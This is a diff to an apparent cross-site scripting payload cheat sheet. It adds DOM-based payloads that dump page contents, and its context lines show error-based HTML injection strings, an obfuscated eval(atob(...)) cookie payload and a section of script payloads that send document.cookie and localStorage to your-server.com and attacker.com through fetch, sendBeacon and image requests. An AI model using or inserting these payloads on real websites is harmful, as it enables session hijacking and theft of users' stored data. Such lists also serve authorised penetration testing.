@@ -19,7 +19,11 @@ Basic XSS:
 	 <img src=x onerror=confirm(document.domain)>
 	 <svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
 
-ERROR based injection :
+DOM:
+ |_ <img src=x onerror="alert(Object.keys(window))">
+    <script>alert(document.documentElement.innerHTML.substring(0,500))</script>
+
+ERROR based injection:
                    |
                    |_ '<font color="red">ERROR 1064 (42000): Rohith had made an error in your Search Field;.jpg'
 		      '<font color="red">ERROR 1064 (42000): <h1>Rohith had made an error in your  Search Field;.jpg'
@@ -65,7 +69,6 @@ SEND DATA YOUR TO YOUR SERVER:
 	<script>navigator.sendBeacon('https://your-server.com/log', JSON.stringify(localStorage))</script>
 	<svg onload="(new Image).src='https://your-server.com/log?'+document.cookie">
         <script>fetch('https://attacker.com/c='+document.cookie)</script>
-
 
 chain xss and htmli
 
